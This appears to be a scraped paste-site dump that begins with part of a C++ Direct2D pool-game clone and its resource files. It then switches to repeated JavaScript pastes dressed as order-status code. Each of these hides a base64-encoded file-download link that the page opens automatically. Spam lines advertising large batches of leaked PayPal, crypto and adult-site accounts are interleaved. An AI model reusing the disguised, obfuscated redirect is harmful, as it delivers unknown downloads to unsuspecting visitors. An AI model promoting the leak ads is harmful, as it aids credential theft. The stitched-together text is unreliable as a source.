    ID2D1SolidColorBrush* pBallBrush = nullptr;

    // Ensure render target is valid before proceeding
    if (!pRT) return;

    HRESULT hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black, 0.8f), &pBgBrush); // Semi-transparent black
    if (FAILED(hr)) { SafeRelease(&pBgBrush); return; } // Exit if brush creation fails

    hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBallBrush); // Placeholder, color will be set per ball
    if (FAILED(hr)) {
        SafeRelease(&pBgBrush);
        SafeRelease(&pBallBrush);
        return; // Exit if brush creation fails
    }

    // Draw the background bar (rounded rect)
    D2D1_ROUNDED_RECT roundedRect = D2D1::RoundedRect(pocketedBallsBarRect, 10.0f, 10.0f); // Corner radius 10
    float baseAlpha = 0.8f;
    float flashBoost = pocketFlashTimer * 0.5f; // Make flash effect boost alpha slightly
    float finalAlpha = std::min(1.0f, baseAlpha + flashBoost);
    pBgBrush->SetOpacity(finalAlpha);
    pRT->FillRoundedRectangle(&roundedRect, pBgBrush);
    pBgBrush->SetOpacity(1.0f); // Reset opacity after drawing

    // --- Draw small circles for pocketed balls inside the bar ---

    // Calculate dimensions based on the bar's height for better scaling
    float barHeight = pocketedBallsBarRect.bottom - pocketedBallsBarRect.top;
    float ballDisplayRadius = barHeight * 0.30f; // Make balls slightly smaller relative to bar height
    float spacing = ballDisplayRadius * 2.2f; // Adjust spacing slightly
    float padding = spacing * 0.75f; // Add padding from the edges
    float center_Y = pocketedBallsBarRect.top + barHeight / 2.0f; // Vertical center

    // Starting X positions with padding
    float currentX_P1 = pocketedBallsBarRect.left + padding;
    float currentX_P2 = pocketedBallsBarRect.right - padding; // Start from right edge minus padding

    int p1DrawnCount = 0;
    int p2DrawnCount = 0;
    const int maxBallsToShow = 7; // Max balls per player in the bar

    for (const auto& b : balls) {
        if (b.isPocketed) {
            // Skip cue ball and 8-ball in this indicator
            if (b.id == 0 || b.id == 8) continue;

            bool isPlayer1Ball = (player1Info.assignedType != BallType::NONE && b.type == player1Info.assignedType);
            bool isPlayer2Ball = (player2Info.assignedType != BallType::NONE && b.type == player2Info.assignedType);

            if (isPlayer1Ball && p1DrawnCount < maxBallsToShow) {
                pBallBrush->SetColor(b.color);
                // Draw P1 balls from left to right
                D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P1 + p1DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                pRT->FillEllipse(&ballEllipse, pBallBrush);
                p1DrawnCount++;
            }
            else if (isPlayer2Ball && p2DrawnCount < maxBallsToShow) {
                pBallBrush->SetColor(b.color);
                // Draw P2 balls from right to left
                D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P2 - p2DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                pRT->FillEllipse(&ballEllipse, pBallBrush);
                p2DrawnCount++;
            }
            // Note: Balls pocketed before assignment or opponent balls are intentionally not shown here.
            // You could add logic here to display them differently if needed (e.g., smaller, grayed out).
        }
    }

    SafeRelease(&pBgBrush);
    SafeRelease(&pBallBrush);
}

void DrawBallInHandIndicator(ID2D1RenderTarget* pRT) {
    if (!isDraggingCueBall && (currentGameState != BALL_IN_HAND_P1 && currentGameState != BALL_IN_HAND_P2 && currentGameState != PRE_BREAK_PLACEMENT)) {
        return; // Only show when placing/dragging
    }

    Ball* cueBall = GetCueBall();
    if (!cueBall) return;

    ID2D1SolidColorBrush* pGhostBrush = nullptr;
    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.6f), &pGhostBrush); // Semi-transparent white

    if (pGhostBrush) {
        D2D1_POINT_2F drawPos;
        if (isDraggingCueBall) {
            drawPos = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
        }
        else {
            // If not dragging but in placement state, show at current ball pos
            drawPos = D2D1::Point2F(cueBall->x, cueBall->y);
        }

        // Check if the placement is valid before drawing differently?
        bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
        bool isValid = IsValidCueBallPosition(drawPos.x, drawPos.y, behindHeadstring);

        if (!isValid) {
            // Maybe draw red outline if invalid placement?
            pGhostBrush->SetColor(D2D1::ColorF(D2D1::ColorF::Red, 0.6f));
        }


        D2D1_ELLIPSE ghostEllipse = D2D1::Ellipse(drawPos, BALL_RADIUS, BALL_RADIUS);
        pRT->FillEllipse(&ghostEllipse, pGhostBrush);
        pRT->DrawEllipse(&ghostEllipse, pGhostBrush, 1.0f); // Outline

        SafeRelease(&pGhostBrush);
    }
}
```

==++ Here's the full source for (file 2/3 (No OOP-based)) ""resource.h""::: ++==
```resource.h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Yahoo-8Ball-Pool-Clone.rc
//
#define IDI_ICON1                       101
// --- NEW Resource IDs (Define these in your .rc file / resource.h) ---
#define IDD_NEWGAMEDLG 106
#define IDC_RADIO_2P   1003
#define IDC_RADIO_CPU  1005
#define IDC_GROUP_AI   1006
#define IDC_RADIO_EASY 1007
#define IDC_RADIO_MEDIUM 1008
#define IDC_RADIO_HARD 1009
// Standard IDOK is usually defined, otherwise define it (e.g., #define IDOK 1)

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

==++ Here's the full source for (file 3/3 (No OOP-based)) ""Yahoo-8Ball-Pool-Clone.rc""::: ++==
```Yahoo-8Ball-Pool-Clone.rc
// Microsoft Visual C++ generated resource script.
//
#include ""resource.h""

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include ""winres.h""

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    ""resource.h\0""
END

2 TEXTINCLUDE 
BEGIN
    ""#include """"winres.h""""\r\n""
    ""\0""
END

3 TEXTINCLUDE 
BEGIN
    ""\r\n""
    ""\0""
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Icon
//

// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_ICON1               ICON                    ""D:\\Download\\cpp-projekt\\FuzenOp_SiloTest\\icons\\shell32_277.ico""

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED

#include <windows.h> // Needed for control styles like WS_GROUP, BS_AUTORADIOBUTTON etc.

/////////////////////////////////////////////////////////////////////////////
//
// Dialog
//

IDD_NEWGAMEDLG DIALOGEX 0, 0, 220, 130 // Dialog position (x, y) and size (width, height) in Dialog Units (DLUs)
STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
CAPTION ""New 8-Ball Game""
FONT 8, ""MS Shell Dlg"", 400, 0, 0x1 // Standard dialog font
BEGIN
// --- Game Mode Selection ---
// Group Box for Game Mode (Optional visually, but helps structure)
GROUPBOX        ""Game Mode"", IDC_STATIC, 7, 7, 90, 50

// ""2 Player"" Radio Button (First in this group)
CONTROL         ""&2 Player (Human vs Human)"", IDC_RADIO_2P, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 14, 20, 80, 10

// ""Human vs CPU"" Radio Button
CONTROL         ""Human vs &CPU"", IDC_RADIO_CPU, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 14, 35, 70, 10


// --- AI Difficulty Selection (Inside its own Group Box) ---
GROUPBOX        ""AI Difficulty"", IDC_GROUP_AI, 118, 7, 95, 70

// ""Easy"" Radio Button (First in the AI group)
CONTROL         ""&Easy"", IDC_RADIO_EASY, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 20, 60, 10

// ""Medium"" Radio Button
CONTROL         ""&Medium"", IDC_RADIO_MEDIUM, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 35, 60, 10

// ""Hard"" Radio Button
CONTROL         ""&Hard"", IDC_RADIO_HARD, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 50, 60, 10


// --- Standard Buttons ---
DEFPUSHBUTTON   ""Start"", IDOK, 55, 105, 50, 14 // Default button (Enter key)
PUSHBUTTON      ""Cancel"", IDCANCEL, 115, 105, 50, 14
END
```"
yU445KNb,Market.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 09:53:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14107/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Fm9BC88X,Crypto Accounts,kammex,JavaScript,Monday 28th of April 2025 09:50:19 PM CDT,69964 Accounts Posted On https://t.me/leakzbyeminem
sQWZLiSA,Untitled,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 09:38:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36529/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Guj29x8t,PayPal with Balance,kammex,JavaScript,Monday 28th of April 2025 09:34:57 PM CDT,89926 Accounts Posted On https://t.me/leakzbyeminem
SZ3XNJFc,Products.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 09:22:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24644/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
b8hNT2xd,Leaked Accounts - Fresh Hits,kammex,JavaScript,Monday 28th of April 2025 09:19:35 PM CDT,98236 Accounts Posted On https://t.me/leakzbyeminem
TvpK7cNX,Order.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 09:07:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95052/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aLPbKXCj,Chaturbate with Tokens,kammex,JavaScript,Monday 28th of April 2025 09:04:13 PM CDT,59951 Accounts Posted On https://t.me/leakzbyeminem
RV9yNwZy,Market.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 08:52:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42048/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
